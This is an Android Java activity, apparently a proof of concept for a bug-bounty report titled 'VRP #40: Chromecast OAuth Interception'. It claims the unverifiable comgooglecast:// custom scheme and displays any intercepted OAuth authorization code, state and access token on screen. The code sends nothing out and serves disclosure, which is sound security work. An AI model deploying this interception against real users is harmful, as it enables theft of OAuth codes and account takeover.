package com.vrp.poc;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

public class CastOAuthInterceptActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView scroll = new ScrollView(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(32, 32, 32, 32);

        TextView title = new TextView(this);
        title.setText("VRP #40: Chromecast OAuth Interception");
        title.setTextSize(20);
        layout.addView(title);

        TextView desc = new TextView(this);
        desc.setText("\nThis activity intercepts comgooglecast:// OAuth callbacks.\n"
                + "Custom schemes cannot be verified via App Links,\n"
                + "allowing any app to register as a handler.\n");
        layout.addView(desc);

        if (getIntent() != null && getIntent().getData() != null) {
            Uri data = getIntent().getData();

            TextView intercepted = new TextView(this);
            intercepted.setText("INTERCEPTED OAuth Callback:");
            intercepted.setTextSize(16);
            intercepted.setTextColor(0xFFFF0000);
            layout.addView(intercepted);

            addField(layout, "Full URI", data.toString());
            addField(layout, "Scheme", data.getScheme());
            addField(layout, "Host", data.getHost());
            addField(layout, "Path", data.getPath());

            String code = data.getQueryParameter("code");
            if (code != null) {
                addField(layout, "AUTH CODE", code);
            }
            String state = data.getQueryParameter("state");
            if (state != null) {
                addField(layout, "State", state);
            }
            String token = data.getQueryParameter("access_token");
            if (token != null) {
                addField(layout, "Access Token", token);
            }

            if (data.getQuery() != null) {
                addField(layout, "All Query Params", data.getQuery());
            }
        } else {
            TextView noData = new TextView(this);
            noData.setText("\nNo OAuth callback intercepted yet.\n"
                    + "Trigger a Chromecast media app OAuth flow to test.");
            layout.addView(noData);
        }

        scroll.addView(layout);
        setContentView(scroll);
    }

    private void addField(LinearLayout layout, String label, String value) {
        TextView tv = new TextView(this);
        tv.setText(label + ": " + (value != null ? value : "null"));
        tv.setPadding(0, 8, 0, 8);
        layout.addView(tv);
    }
}
